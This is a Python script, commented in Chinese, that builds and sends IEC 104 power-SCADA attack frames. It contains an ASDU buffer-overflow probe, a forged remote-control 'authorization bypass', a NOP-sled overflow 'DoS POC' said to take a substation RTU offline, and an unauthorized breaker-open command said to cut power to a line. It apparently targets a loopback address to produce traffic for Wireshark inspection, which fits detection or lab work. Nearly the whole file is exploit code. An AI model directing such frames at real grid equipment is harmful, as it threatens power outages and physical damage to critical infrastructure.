from iec_base import *

DEST = LOOPBACK_DST

# 漏洞1：ASDU缓冲区溢出探测（限制长度240字节，data_len=244≤255）
def scan_asdu_overflow():
    overflow_asdu = b"A" * 240
    frame = build_iec_frame(apci_type=0x00, tx_seq=10, rx_seq=0, asdu_payload=overflow_asdu)
    send_iec_tcp_pkt(DEST, sport=53000, full_frame=frame)
    IECLog.warn("IEC104原生漏洞探测：超长ASDU载荷缓冲区溢出扫描包(0x41填充)")

# 漏洞2：遥控权限绕过探测（伪造非法遥控指令）
def scan_remote_ctrl_bypass():
    # 非法遥控分合闸ASDU，跳过主站权限校验逻辑
    ctrl_asdu = struct.pack("<HB", 0x0001, 0x01)
    frame = build_iec_frame(apci_type=0x00, tx_seq=11, rx_seq=0, asdu_payload=ctrl_asdu)
    send_iec_tcp_pkt(DEST, sport=53001, full_frame=frame)
    IECLog.warn("IEC104原生漏洞探测：未授权遥控指令绕过，非法分合闸操作扫描包")

# POC1：缓冲区溢出DoS攻击载荷（NOP雪橇0x90，总长控制240字节）
def poc_station_dos():
    exp_shell = b"\x90" * 236 + b"\xff\xff\xff\xff"
    exp_frame = build_iec_frame(apci_type=0x00, tx_seq=12, rx_seq=0, asdu_payload=exp_shell)
    send_iec_tcp_pkt(DEST, sport=53002, full_frame=exp_frame)
    IECLog.exploit("IEC104 DoS攻击POC：ASDU溢出导致变电站RTU离线，电力监控中断")

# POC2：恶意遥控操作POC（非法远程分闸）
def poc_illegal_switch_ctrl():
    # 恶意分闸指令载荷
    malicious_ctrl = struct.pack("<HB", 0x0005, 0x00)
    exp_frame = build_iec_frame(apci_type=0x00, tx_seq=13, rx_seq=0, asdu_payload=malicious_ctrl)
    send_iec_tcp_pkt(DEST, sport=53003, full_frame=exp_frame)
    IECLog.exploit("IEC104恶意操作POC：越权遥控分闸，造成线路断电、生产停机风险")

if __name__ == "__main__":
    print("===== IEC104 电力SCADA原生漏洞扫描 + POC攻击流量生成 =====")
    scan_asdu_overflow()
    scan_remote_ctrl_bypass()
    poc_station_dos()
    poc_illegal_switch_ctrl()
    print("===== 攻击流量发送完成，Wireshark过滤 tcp.port == 2404 查看恶意报文 =====\n")